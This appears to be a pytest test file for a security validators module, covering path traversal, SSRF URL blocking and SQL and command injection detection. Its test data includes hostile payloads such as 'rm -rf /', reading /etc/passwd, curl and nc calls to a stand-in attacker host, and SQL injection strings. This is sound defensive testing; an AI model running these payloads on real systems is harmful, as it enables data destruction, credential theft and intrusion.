"""Unit tests for low-level security validators.

Contract assumed from `app.security.validators`:

    class SecurityValidationError(Exception): ...

    validate_path(path: str, allowed_roots: list[Path]) -> None   # raises on failure
    validate_url(url: str, allowed_hosts: list[str],
                 allow_private: bool = False) -> None             # raises on failure

    detect_sql_injection(s: str) -> list[str]        # returns list of matched pattern names
    detect_command_injection(s: str) -> list[str]
"""

from __future__ import annotations

from pathlib import Path

import pytest

from app.security.validators import (
    SecurityValidationError,
    detect_command_injection,
    detect_sql_injection,
    validate_path,
    validate_url,
)


# ---- path validation -----------------------------------------------------

def test_path_traversal_rejected(tmp_path: Path):
    root = tmp_path / "reports"
    root.mkdir()
    with pytest.raises(SecurityValidationError):
        validate_path(str(root / ".." / "etc" / "passwd"), allowed_roots=[root])


def test_absolute_path_outside_root_rejected(tmp_path: Path):
    root = tmp_path / "reports"
    root.mkdir()
    outside = tmp_path / "other"
    outside.mkdir()
    with pytest.raises(SecurityValidationError):
        validate_path(str(outside / "x.txt"), allowed_roots=[root])


def test_path_inside_root_ok(tmp_path: Path):
    root = tmp_path / "reports"
    root.mkdir()
    f = root / "q1.txt"
    f.write_text("hi", encoding="utf-8")
    validate_path(str(f), allowed_roots=[root])  # must not raise


def test_system_path_rejected(tmp_path: Path):
    root = tmp_path / "reports"
    root.mkdir()
    with pytest.raises(SecurityValidationError):
        validate_path("/etc/shadow", allowed_roots=[root])


# ---- SSRF / URL validation ----------------------------------------------

@pytest.mark.parametrize(
    "url",
    [
        "http://localhost/admin",
        "http://127.0.0.1/",
        "http://10.0.0.1/",
        "http://192.168.1.1/",
        "http://169.254.169.254/latest/meta-data/",  # cloud metadata
        "http://[::1]/",
    ],
)
def test_ssrf_targets_rejected(url: str):
    with pytest.raises(SecurityValidationError):
        validate_url(url, allowed_hosts=["api.company.local"])


def test_allowed_domain_accepted():
    validate_url("https://api.company.local/v1/x", allowed_hosts=["api.company.local"])


def test_unlisted_domain_rejected():
    with pytest.raises(SecurityValidationError):
        validate_url("https://evil.example/v1/x", allowed_hosts=["api.company.local"])


# ---- injection pattern detectors ----------------------------------------

def test_sql_injection_detection_union_select():
    hits = detect_sql_injection("1 UNION SELECT password FROM users --")
    assert any("union" in h.lower() for h in hits)


def test_sql_injection_detection_comment_terminator():
    hits = detect_sql_injection("' OR '1'='1' --")
    assert hits


def test_sql_injection_clean_string():
    assert detect_sql_injection("weekly report summary") == []


@pytest.mark.parametrize(
    "payload",
    [
        "; rm -rf /",
        "`whoami`",
        "$(cat /etc/passwd)",
        "&& curl http://attacker.test",
        "| nc attacker.test 4444",
    ],
)
def test_command_injection_detection(payload: str):
    hits = detect_command_injection(payload)
    assert hits, f"expected detection for payload: {payload!r}"


def test_command_injection_clean_string():
    assert detect_command_injection("Hello Alice, here is your report.") == []